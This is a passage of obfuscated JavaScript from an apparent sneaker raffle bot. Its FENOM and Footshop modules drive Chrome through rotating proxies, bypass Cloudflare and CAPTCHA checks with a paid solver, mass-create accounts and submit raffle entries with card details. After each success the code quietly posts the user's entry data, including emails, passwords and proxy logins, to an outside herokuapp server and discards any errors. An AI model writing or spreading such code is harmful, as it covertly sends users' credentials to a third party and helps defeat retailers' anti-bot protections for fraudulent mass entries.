                                    console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x36efa4 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x54ff2c = await _0x2926d5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x48786a[0x0] + ':' + _0x48786a[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x54ff2c = await _0x2926d5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x48786a[0x0] + ':' + _0x48786a[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x9aeac = await _0x54ff2c['newPage']();
                                await _0x9aeac['setViewport']({
                                    'width': 0x500 + _0xa85770(0x1, 0x32),
                                    'height': 0x2d9 + _0xa85770(0x1, 0x32)
                                });
                                const _0x57f038 = await _0x9aeac['target']()['createCDPSession'](), { windowId: _0x39cfb9 } = await _0x57f038['send']('Browser.getWindowForTarget');
                                await _0x9aeac['authenticate']({
                                    'username': '' + _0x48786a[0x2],
                                    'password': '' + _0x48786a[0x3]
                                }), console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9aeac['goto']('' + _0x426896, { 'waitUntil': 'networkidle2' }), console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x289b0b(0x1388);
                                var _0x26ca6f = await _0x9aeac['$']('.hcaptcha-box');
                                if (_0x26ca6f) {
                                    console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x289b0b(0x2710);
                                    const _0x2175de = await _0x9aeac['$']('.hcaptcha-box');
                                    if (_0x2175de)
                                        try {
                                            await _0x2175de['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x9aeac['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x1652c2 = await _0x9aeac['$']('.hcaptcha-box');
                                        if (_0x1652c2)
                                            try {
                                                await _0x1652c2['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x9aeac['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x57f038['send']('Browser.setWindowBounds', {
                                        'windowId': _0x39cfb9,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x289b0b(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x9aeac['type']('input[name=\x22firstname\x22]', '' + _0x50eafd[_0x326169]['FirstName']), await _0x289b0b(0x1f4), await _0x9aeac['type']('input[name=\x22lastname\x22]', '' + _0x50eafd[_0x326169]['LastName']), await _0x289b0b(0x1f4), await _0x9aeac['type']('input[name=\x22email\x22]', '' + _0x50eafd[_0x326169]['Email']), await _0x289b0b(0x1f4), await _0x9aeac['type']('input[name=\x22password\x22]', '' + _0x50eafd[_0x326169]['Password']), await _0x289b0b(0x258), await _0x9aeac['$eval']('input[name=\x22psgdpr\x22]', _0x3f9e50 => _0x3f9e50['click']()), await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x9aeac['$eval']('#customer-form', _0x5ba698 => _0x5ba698['submit']());
                                try {
                                    try {
                                        await _0x9aeac['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x583eb0 = 'no', console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Account\x20' + _0x50eafd[_0x326169]['Email'] + '\x20Generated')), _0x457b0a['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x50eafd[_0x326169]['Email'] + ',' + _0x50eafd[_0x326169]['Password']);
                                    let _0x5c6f4e = _0x50eafd[_0x326169];
                                    try {
                                        prxdata = {
                                            'username': _0x2e53d0['replace']('#', ''),
                                            'module': _0x23b2fc['name'],
                                            'entrydata': JSON['stringify'](_0x5c6f4e),
                                            'proxy': '' + _0x28e7b5[_0x326169]
                                        };
                                        var _0x2786b3 = JSON['stringify'](prxdata);
                                        let _0x27e236 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x2786b3, _0x27e236);
                                    } catch (_0x467151) {
                                    }
                                    try {
                                        _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x5a8432['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x15c654(_0x534fd1, _0x5a8432['succesDEVMSG']);
                                } catch (_0x3b4df6) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x368e98) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20' + _0x368e98)), _0x4cdacd = '' + _0x368e98;
                                var _0x55e12f = await _0x117512(_0x50eafd[_0x326169], _0x23b2fc, 'acc', !![], _0x4cdacd);
                                _0x5a8432['errorDEV'] = { 'embeds': [_0x55e12f] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x5a8432['errorDEV']), await _0x15c654(_0x34ab86, _0x5a8432['errorDEV']), _0x583eb0 = 'yes';
                            } finally {
                                _0x54ff2c && _0x54ff2c['close']();
                                if (_0x583eb0 == 'yes' && _0x2a478f != 0x5)
                                    return console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Task\x20' + (_0x326169 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a478f + '\x20/\x205)')), _0x2a478f = _0x2a478f + 0x1, _0x4c163d--, _0x77f5b7(_0x23b2fc, _0x50eafd, _0x28e7b5, _0x326169, _0x2a478f);
                                _0x583eb0 == 'yes' && _0x2a478f >= 0x5 && _0x5f4429(_0x50eafd[_0x326169], _0x23b2fc), !_0x36efa4 && (console['log'](_0x3d201d() + '\x20[' + _0x23b2fc['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay'])), _0x4c163d--;
                            }
                        }
                        _0x77f5b7(_0x507667, _0x161400, _0x1ab318, _0x2bdd2d), !_0x36efa4 && await _0x289b0b(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x487856(_0x2586d0, _0x57f3a6, _0x2d25a6) {
                    _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x79d23a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x339319 = 0x0; _0x339319 < _0x57f3a6['length']; _0x339319++) {
                        if (_0x4e4db2 != 'yes')
                            var _0x4e4db2 = '', _0x32f4bd = 0x0;
                        var _0x218137;
                        try {
                            await _0x5af4d5(_0x57f3a6, _0x339319);
                        } catch {
                            _0x4e4db2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x25b0b6(_0x2586d0['name'] + '\x20Task\x20' + (_0x339319 + 0x1) + '\x20/\x20' + _0x57f3a6['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                        const _0x39b3b3 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x49f05d = Math['round'](Math['random']() * (_0x2d25a6['length'] - 0x1)), _0x4366a4 = _0x2d25a6[_0x49f05d]['split'](':'), _0x185872;
                        try {
                            _0x185872 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4366a4[0x0] + ':' + _0x4366a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x185872 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4366a4[0x0] + ':' + _0x4366a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1bddf5 = await _0x185872['newPage'](), _0x429a4c = await _0x1bddf5['target']()['createCDPSession'](), { windowId: _0x16c3fa } = await _0x429a4c['send']('Browser.getWindowForTarget');
                            await _0x1bddf5['authenticate']({
                                'username': '' + _0x4366a4[0x2],
                                'password': '' + _0x4366a4[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1bddf5['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x289b0b(0x1388);
                            var _0x2fc9bc = await _0x1bddf5['$']('.hcaptcha-box');
                            if (_0x2fc9bc) {
                                console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x289b0b(0x2710);
                                const _0x182282 = await _0x1bddf5['$']('.hcaptcha-box');
                                if (_0x182282)
                                    try {
                                        await _0x182282['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x1bddf5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x57967c = await _0x1bddf5['$']('.hcaptcha-box');
                                    if (_0x57967c)
                                        try {
                                            await _0x57967c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x429a4c['send']('Browser.setWindowBounds', {
                                'windowId': _0x16c3fa,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x289b0b(0x1f40);
                            try {
                                await _0x1bddf5['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x289b0b(0x1388), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1bddf5['type']('input[name=\x22email\x22]', '' + _0x57f3a6[_0x339319]['Email']), await _0x289b0b(0x1f4), await _0x1bddf5['type']('input[name=\x22password\x22]', '' + _0x57f3a6[_0x339319]['Password']), await _0x289b0b(0x258), await _0x1bddf5['$eval']('#login-form', _0x5450b7 => _0x5450b7['submit']()), await _0x1bddf5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x289b0b(0x1f4), await _0x1bddf5['goto']('' + _0x57f3a6[_0x339319]['Url']), await _0x1bddf5['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x57f3a6[_0x339319]['Size']);
                            if (_0x57f3a6[_0x339319]['Size'] != 'RANDOM') {
                                var _0x227844 = '\x20' + _0x57f3a6[_0x339319]['Size'] + '\x20';
                                const _0x535bed = await _0x1bddf5['$x']('//span[contains(text(),\x20' + _0x227844 + ')]');
                                await _0x535bed[0x0]['click']();
                            } else {
                                const _0x1e5d11 = await _0x1bddf5['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x18bc35 = Math['round'](Math['random']() * (_0x1e5d11['length'] - 0x1));
                                await _0x1e5d11[_0x18bc35]['click']();
                            }
                            await _0x289b0b(0x258), await _0x1bddf5['click']('#cookieChoiceDismiss'), await _0x289b0b(0x3e8), await _0x1bddf5['type']('#instagram-account', '' + _0x57f3a6[_0x339319]['Follower']), await _0x289b0b(0x28a), await _0x1bddf5['click']('#book-btn'), await _0x289b0b(0xbb8);
                            try {
                                await _0x1bddf5['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20' + _0x1ac777['cyan']('Solving\x20Captcha')), await _0x1bddf5['solveRecaptchas'](), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x289b0b(0x7d0), await _0x1bddf5['$eval']('#book-btn-for-sure', _0x344e15 => _0x344e15['click']()), await _0x289b0b(0x12c), await _0x1bddf5['click']('#book-btn-for-sure'), await _0x289b0b(0xdac);
                            const _0x187ac1 = await _0x1bddf5['$eval']('.reservation-popup\x20>\x20.title', _0x1b3ef1 => {
                                return _0x1b3ef1['innerHTML'];
                            });
                            if (_0x187ac1) {
                                _0x4e4db2 = 'no', _0x53c50d(_0x57f3a6[_0x339319], _0x2586d0), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x590088 = await _0x117512(_0x57f3a6[_0x339319], _0x2586d0, 'dev', ![]), _0x168286 = await _0x117512(_0x57f3a6[_0x339319], _0x2586d0, 'pub', ![]);
                                let _0x17bc68 = _0x57f3a6[_0x339319];
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'module': _0x2586d0['name'],
                                        'entrydata': JSON['stringify'](_0x17bc68),
                                        'proxy': '' + _0x2d25a6[_0x339319]
                                    };
                                    var _0x1f1d53 = JSON['stringify'](prxdata);
                                    let _0x22abea = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x1f1d53, _0x22abea);
                                } catch (_0x487863) {
                                }
                                const _0x3a33b9 = {
                                    'succesDEVMSG': { 'embeds': [_0x590088] },
                                    'succesPUBMSG': { 'embeds': [_0x168286] }
                                };
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x3a33b9['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x3a33b9['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x3a33b9['succesPUBMSG']);
                                } catch (_0x1df43a) {
                                    console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1df43a));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x545fb5) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20' + _0x545fb5)), _0x218137 = '' + _0x545fb5;
                            var _0xaa8b0e = await _0x117512(_0x57f3a6[_0x339319], _0x2586d0, 'dev', !![], _0x218137), _0x590088 = await _0x117512(_0x57f3a6[_0x339319], _0x2586d0, 'dev', ![]), _0x168286 = await _0x117512(_0x57f3a6[_0x339319], _0x2586d0, 'pub', ![]);
                            const _0x53530b = {
                                'succesDEVMSG': { 'embeds': [_0x590088] },
                                'succesPUBMSG': { 'embeds': [_0x168286] }
                            };
                            _0x53530b['errorDEV'] = { 'embeds': [_0xaa8b0e] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x53530b['errorDEV']), await _0x15c654(_0x34ab86, _0x53530b['errorDEV']), _0x545fb5 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x4e4db2 = 'yes');
                        } finally {
                            _0x185872['close']();
                            if (_0x4e4db2 == 'yes' && _0x32f4bd != 0x5 && _0x218137 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Task\x20' + (_0x339319 + 0x1) + '\x20:\x20Retrying\x20(' + _0x32f4bd + '\x20/\x205)')), _0x339319 = _0x339319 - 0x1, _0x32f4bd = _0x32f4bd + 0x1;
                                continue;
                            }
                            _0x4e4db2 == 'yes' && _0x32f4bd >= 0x5 && (_0x5f4429(_0x57f3a6[_0x339319], _0x2586d0), _0x4e4db2 = 'no', _0x32f4bd = 0x0), console['log'](_0x3d201d() + '\x20[' + _0x2586d0['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x1d2527, _0x356539, _0x2330aa) {
                _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x79d23a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x153b24 = 0x0; _0x153b24 < _0x356539['length']; _0x153b24++) {
                    var _0x223ae3;
                    if (_0x21adea != 'yes')
                        var _0x21adea = '', _0x5f013e = 0x0;
                    var _0x5c578c = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x2e53d0
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x356539[_0x153b24]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x356539[_0x153b24]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x79d23a['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x492c9c
                            }
                        ]
                    }], _0xe4f657 = await _0x117512(_0x356539[_0x153b24], _0x1d2527, 'dev', ![]), _0x253fac = await _0x117512(_0x356539[_0x153b24], _0x1d2527, 'pub', ![]);
                    const _0x315beb = {
                        'succesDEVMSG': { 'embeds': [_0xe4f657] },
                        'succesPUBMSG': { 'embeds': [_0x253fac] }
                    }, _0x27d1d2 = { 'embeds': _0x5c578c };
                    try {
                        await _0x5af4d5(_0x356539, _0x153b24);
                    } catch {
                        _0x21adea = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x356539[_0x153b24]['Email'] == '' || _0x356539[_0x153b24]['FirstName'] == '' || _0x356539[_0x153b24]['LastName'] == '' || _0x356539[_0x153b24]['Country'] == '' || _0x356539[_0x153b24]['Size'] == '' || _0x356539[_0x153b24]['Address1'] == '' || _0x356539[_0x153b24]['Zip'] == '') {
                        console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x356539[_0x153b24]['Email'] == '' || _0x356539[_0x153b24]['FirstName'] == '' || _0x356539[_0x153b24]['LastName'] == '' || _0x356539[_0x153b24]['Country'] == '' || _0x356539[_0x153b24]['Size'] == '' || _0x356539[_0x153b24]['Address1'] == '' || _0x356539[_0x153b24]['Zip'] == '' || _0x356539[_0x153b24]['Phone'] == '') {
                        console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x5b4bd3 = '' + _0x356539[_0x153b24]['Url'];
                    if (_0x79d23a['useRandomProxy'] = ![])
                        var _0x5ef78f = _0x2330aa[_0x153b24]['split'](':');
                    else
                        var _0xe42385 = Math['round'](Math['random']() * (_0x2330aa['length'] - 0x1)), _0x5ef78f = _0x2330aa[_0xe42385]['split'](':');
                    var _0x54c314;
                    try {
                        _0x54c314 = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ef78f[0x0] + ':' + _0x5ef78f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x54c314 = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ef78f[0x0] + ':' + _0x5ef78f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x15799e = await _0x54c314['newPage']();
                        await _0x15799e['authenticate']({
                            'username': '' + _0x5ef78f[0x2],
                            'password': '' + _0x5ef78f[0x3]
                        }), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15799e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x15799e['setRequestInterception'](!![]), _0x15799e['on']('request', _0x221314 => {
                            _0x221314['resourceType']() === 'image' || _0x221314['resourceType']() === 'font' || _0x221314['resourceType']() === 'media' ? _0x221314['abort']() : _0x221314['continue']();
                        });
                        try {
                            await _0x15799e['goto'](_0x5b4bd3), await _0x289b0b(0xbb8), await _0x15799e['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x15799e['click']('.control__JhutY'), await _0x289b0b(0x1f4);
                        if (_0x356539[_0x153b24]['Size'] != 'RANDOM')
                            try {
                                const _0x2402c5 = await _0x15799e['$x']('//div[contains(text(),\x20\x27' + _0x356539[_0x153b24]['Size'] + '\x27)]');
                                await _0x2402c5[0x0]['click']();
                            } catch {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x512a43 = await _0x15799e['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x59a110 = Math['round'](Math['random']() * (_0x512a43['length'] - 0x1));
                            await _0x512a43[_0x59a110]['click']();
                        }
                        await _0x289b0b(0x4b0);
                        const _0x3de66d = await _0x15799e['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3de66d[0x0]['click'](), await _0x15799e['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x15799e['type']('input[name=\x22email\x22]', '' + _0x356539[_0x153b24]['Email']), await _0x289b0b(0x640), await _0x15799e['type']('input[name=\x22phone\x22]', '' + _0x356539[_0x153b24]['Phone']), await _0x289b0b(0x4b0), await _0x15799e['click']('button.btn.continue-button__1RtsS'), await _0x289b0b(0x4b0);
                        try {
                            await _0x15799e['type']('input[name=\x22firstName\x22]', '' + _0x356539[_0x153b24]['FirstName']), await _0x289b0b(0x258);
                        } catch {
                            const _0x59fabb = await _0x15799e['$$eval']('.invalid-feedback\x20>\x20div', _0x234075 => {
                                return _0x234075['map'](_0x5c23a8 => _0x5c23a8['innerText']);
                            });
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20' + _0x59fabb));
                            continue;
                        }
                        await _0x15799e['type']('input[name=\x22lastName\x22]', '' + _0x356539[_0x153b24]['LastName']), await _0x289b0b(0xc8), await _0x15799e['type']('input[name=\x22instagramUsername\x22]', '' + _0x356539[_0x153b24]['Follower']), await _0x289b0b(0x4b0), await _0x15799e['click']('button.btn.continue-button__1RtsS'), await _0x289b0b(0x3e8), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x15799e['select']('select[name=\x22country\x22]', '' + _0x356539[_0x153b24]['Country']), await _0x289b0b(0x2bc), await _0x15799e['type']('input[name=\x22streetName\x22]', '' + _0x356539[_0x153b24]['Address1']), await _0x289b0b(0x258), await _0x15799e['type']('input[name=\x22houseNumber\x22]', _0x356539[_0x153b24]['HouseNumber'] + '\x20' + _0x356539[_0x153b24]['Address2']), await _0x289b0b(0xc8), await _0x15799e['type']('input[name=\x22postalCode\x22]', '' + _0x356539[_0x153b24]['Zip']), await _0x289b0b(0x1f4), await _0x15799e['type']('input[name=\x22city\x22]', '' + _0x356539[_0x153b24]['City']), await _0x289b0b(0x4b0), await _0x15799e['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x289b0b(0x4b0), await _0x15799e['click']('button.btn.continue-button__1RtsS'), await _0x289b0b(0x4b0), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x15799e['solveRecaptchas'](), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x289b0b(0xbb8), await _0x15799e['click']('button.btn.continue-button__1RtsS'), await _0x289b0b(0x1388), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x15799e['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x15799e['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x289b0b(0x4b0), await _0x15799e['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x356539[_0x153b24]['CardNumber']), await _0x289b0b(0x320), await _0x15799e['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x15799e['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x356539[_0x153b24]['ExpiryDate']), await _0x289b0b(0x4b0), await _0x15799e['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x15799e['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x356539[_0x153b24]['CVV']), await _0x289b0b(0x226), await _0x15799e['type']('input[name=\x22holderName\x22]', '' + _0x356539[_0x153b24]['NameOnCard']), await _0x289b0b(0x226), await _0x15799e['click']('button.adyen-checkout__button'), console['log'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x15799e['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x289b0b(0xbb8);
                        } catch (_0x27a9c1) {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x203DS\x20Failed')), _0x223ae3 = '3DS\x20Error\x20' + _0x27a9c1;
                            var _0x5aab4e = await _0x117512(_0x356539[_0x153b24], _0x1d2527, 'dev', !![], _0x223ae3);
                            _0x315beb['errorDEV'] = { 'embeds': [_0x5aab4e] };
                            _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x315beb['errorDEV']);
                            await _0x15c654(_0x34ab86, _0x315beb['errorDEV']);
                            continue;
                        }
                        _0x53c50d(_0x356539[_0x153b24], _0x1d2527), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x1d2527['name'] + ']\x20Task\x20' + (_0x153b24 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
